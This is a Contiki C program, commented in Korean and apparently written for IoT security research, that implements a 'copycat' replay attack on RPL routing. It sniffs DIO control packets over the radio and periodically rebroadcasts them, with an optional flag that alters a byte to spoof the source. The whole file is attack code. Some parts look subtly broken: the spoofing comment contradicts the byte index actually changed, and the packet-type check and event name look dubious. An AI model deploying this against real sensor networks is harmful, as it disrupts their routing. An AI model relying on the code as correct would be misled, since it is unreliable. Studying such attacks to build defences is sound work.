#include "contiki.h"
#include "net/routing/rpl-classic/rpl.h"
#include "net/netstack.h"
#include "net/packetbuf.h"
#include "net/ipv6/uip.h"
#include "sys/log.h"

#define LOG_MODULE "COPYCAT"
#define LOG_LEVEL LOG_LEVEL_INFO

// 공격 설정
#define REPLAY_INTERVAL (5 * CLOCK_SECOND)
#define SPOOF_ENABLE 0  // 0 = non-spoofed, 1 = spoofed

static uint8_t saved_dio[128];
static int saved_dio_len = 0;

PROCESS(copycat_process, "Copycat attacker");
AUTOSTART_PROCESSES(&copycat_process);

PROCESS_THREAD(copycat_process, ev, data)
{
  static struct etimer periodic;
  PROCESS_BEGIN();

  LOG_INFO("Copycat attacker started.\n");

  // 무선 패킷 스니핑
  NETSTACK_RADIO.set_value(RADIO_PARAM_RX_MODE, 1);

  etimer_set(&periodic, REPLAY_INTERVAL);

  while(1) {
    PROCESS_YIELD();

    // 수신 이벤트: DIO 패킷 스니핑
    if(ev == packetbuf_event) {
      uint8_t *ptr = packetbuf_dataptr();
      int len = packetbuf_datalen();

      if(len > 0 && ptr[0] == RPL_CODE_DIO) {
        memcpy(saved_dio, ptr, len);
        saved_dio_len = len;
        LOG_INFO("Eavesdropped DIO (len=%d)\n", len);
      }
    }

    // 주기적 재생
    if(etimer_expired(&periodic) && saved_dio_len > 0) {
      LOG_WARN("Replaying DIO packet\n");

      uint8_t replay_buf[128];
      memcpy(replay_buf, saved_dio, saved_dio_len);

      if(SPOOF_ENABLE) {
        // 출처 spoofing 예: 마지막 1바이트 변경
        replay_buf[1] = 0x99;
      }

      packetbuf_clear();
      packetbuf_copyfrom(replay_buf, saved_dio_len);

      NETSTACK_RADIO.send(replay_buf, saved_dio_len);
      etimer_reset(&periodic);
    }
  }

  PROCESS_END();
}